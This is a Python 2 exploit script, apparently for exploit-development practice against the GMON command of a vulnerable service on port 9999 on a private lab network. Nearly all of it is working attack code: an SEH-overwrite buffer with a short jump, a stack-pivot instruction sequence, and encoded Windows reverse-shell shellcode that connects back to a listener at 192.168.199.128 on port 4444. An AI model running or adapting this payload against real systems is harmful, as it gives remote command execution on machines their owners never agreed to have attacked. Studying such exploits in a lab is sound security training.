#!/usr/bin/python

import socket
import struct

ip_addr = '192.168.199.130'
port = 9999

print "GMON command - Exploit, Stack Pivot\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip_addr, int(port)))

except Exception as e:
    print "[-] Failed to connect to service %s" % e

else:
    print "[+] Connected to server"

    # Get banner response
    data = s.recv(1024)
    print(data)
    
    # Setup evil buffer 
    command_str = "GMON /.:/"
    nseh = '\x90\x90\xeb\x06' 
    seh = struct.pack("<I", 0x625010B4)

    # Stack Pivot
    # 00B7FFE8   83C4 68          ADD ESP,68
    # 00B7FFEB   83C4 5C          ADD ESP,5C
    # 00B7FFEE   FF2424           JMP DWORD PTR SS:[ESP]
    stack_pivot = '\x90'*4 + '\x83\xC4\x68\x83\xC4\x5C\xFF\x24\x24'

    # Reverse Shell
    # msfpayload windows/shell_reverse_tcp LHOST=192.168.199.128 LPORT=4444 EXITFUN=NONE R | msfencode -b '\x00' -t c
    buf = (
    "\xba\x39\x36\x12\x17\xda\xd7\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
    "\x52\x83\xc6\x04\x31\x56\x0e\x03\x6f\x38\xf0\xe2\x73\xac\x76"
    "\x0c\x8b\x2d\x17\x84\x6e\x1c\x17\xf2\xfb\x0f\xa7\x70\xa9\xa3"
    "\x4c\xd4\x59\x37\x20\xf1\x6e\xf0\x8f\x27\x41\x01\xa3\x14\xc0"
    "\x81\xbe\x48\x22\xbb\x70\x9d\x23\xfc\x6d\x6c\x71\x55\xf9\xc3"
    "\x65\xd2\xb7\xdf\x0e\xa8\x56\x58\xf3\x79\x58\x49\xa2\xf2\x03"
    "\x49\x45\xd6\x3f\xc0\x5d\x3b\x05\x9a\xd6\x8f\xf1\x1d\x3e\xde"
    "\xfa\xb2\x7f\xee\x08\xca\xb8\xc9\xf2\xb9\xb0\x29\x8e\xb9\x07"
    "\x53\x54\x4f\x93\xf3\x1f\xf7\x7f\x05\xf3\x6e\xf4\x09\xb8\xe5"
    "\x52\x0e\x3f\x29\xe9\x2a\xb4\xcc\x3d\xbb\x8e\xea\x99\xe7\x55"
    "\x92\xb8\x4d\x3b\xab\xda\x2d\xe4\x09\x91\xc0\xf1\x23\xf8\x8c"
    "\x36\x0e\x02\x4d\x51\x19\x71\x7f\xfe\xb1\x1d\x33\x77\x1c\xda"
    "\x34\xa2\xd8\x74\xcb\x4d\x19\x5d\x08\x19\x49\xf5\xb9\x22\x02"
    "\x05\x45\xf7\x85\x55\xe9\xa8\x65\x05\x49\x19\x0e\x4f\x46\x46"
    "\x2e\x70\x8c\xef\xc5\x8b\x47\xd0\xb2\x54\x17\xb8\xc0\x5a\x09"
    "\x65\x4c\xbc\x43\x85\x18\x17\xfc\x3c\x01\xe3\x9d\xc1\x9f\x8e"
    "\x9e\x4a\x2c\x6f\x50\xbb\x59\x63\x05\x4b\x14\xd9\x80\x54\x82"
    "\x75\x4e\xc6\x49\x85\x19\xfb\xc5\xd2\x4e\xcd\x1f\xb6\x62\x74"
    "\xb6\xa4\x7e\xe0\xf1\x6c\xa5\xd1\xfc\x6d\x28\x6d\xdb\x7d\xf4"
    "\x6e\x67\x29\xa8\x38\x31\x87\x0e\x93\xf3\x71\xd9\x48\x5a\x15"
    "\x9c\xa2\x5d\x63\xa1\xee\x2b\x8b\x10\x47\x6a\xb4\x9d\x0f\x7a"
    "\xcd\xc3\xaf\x85\x04\x40\xdf\xcf\x04\xe1\x48\x96\xdd\xb3\x14"
    "\x29\x08\xf7\x20\xaa\xb8\x88\xd6\xb2\xc9\x8d\x93\x74\x22\xfc"
    "\x8c\x10\x44\x53\xac\x30"
    )

    reverse_shell_buffer = '\x90' * (3495 - len(buf) - 100) + buf + '\x90'*100

 
    buffer = "GMON /.:/" + reverse_shell_buffer + nseh + seh + stack_pivot + 'E' * (5000-3495-4-4-len(stack_pivot))

    bytes_sent = s.send(buffer)
    print "Sent %s bytes" % bytes_sent


finally:
    s.close()